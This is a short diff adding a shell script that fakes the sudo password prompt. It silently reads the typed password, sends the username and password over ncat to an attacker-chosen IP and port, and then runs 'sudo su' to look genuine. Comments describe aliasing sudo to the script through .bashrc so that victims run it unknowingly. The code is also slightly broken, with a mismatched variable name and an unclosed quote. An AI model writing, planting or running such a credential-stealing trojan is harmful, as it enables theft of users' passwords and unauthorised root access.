@@ -1,0 +1,8 @@
+echo -n Password:\ 
+read -s pwd
+ncat [IP] [port] -c "echo `whoami`:$password #change IP and Port accordingly
+echo
+sudo su
+#set suitable alias for sudo:
+#alias sudo="~/.bash_rc"
+#source .bashrc
